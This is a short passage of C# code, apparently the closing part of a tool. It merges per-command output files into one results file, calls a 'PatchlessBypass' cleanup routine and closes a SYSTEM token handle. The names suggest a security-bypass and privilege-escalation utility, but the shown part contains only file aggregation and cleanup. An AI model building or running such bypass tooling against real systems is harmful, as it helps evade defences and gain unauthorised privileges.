            summary.AppendLine($"{summaryTotalFiles} {commands.Length}");
            summary.AppendLine($"{summaryOutputDir} {outputDir}");
            
            File.WriteAllText(summaryFile, summary.ToString(), Encoding.UTF8);
            
            // Gesamtdatei
            string allResultsFile = Path.Combine(outputDir, "00_ALL_RESULTS.txt");
            StringBuilder allResults = new StringBuilder();
            foreach (var cmdName in commandNames)
            {
                string file = Path.Combine(outputDir, $"{cmdName}.txt");
                if (File.Exists(file))
                {
                    allResults.AppendLine(new string('=', 80));
                    allResults.AppendLine($"=== {cmdName} ===");
                    allResults.AppendLine(new string('-', 80));
                    allResults.AppendLine(File.ReadAllText(file));
                    allResults.AppendLine();
                }
            }
            File.WriteAllText(allResultsFile, allResults.ToString(), Encoding.UTF8);
            
            // Cleanup
            PatchlessBypass.Cleanup();
            if (systemToken != IntPtr.Zero)
                NativeMethods.CloseHandle(systemToken);
            
            Environment.Exit(0);
        }
    }
    #endregion
}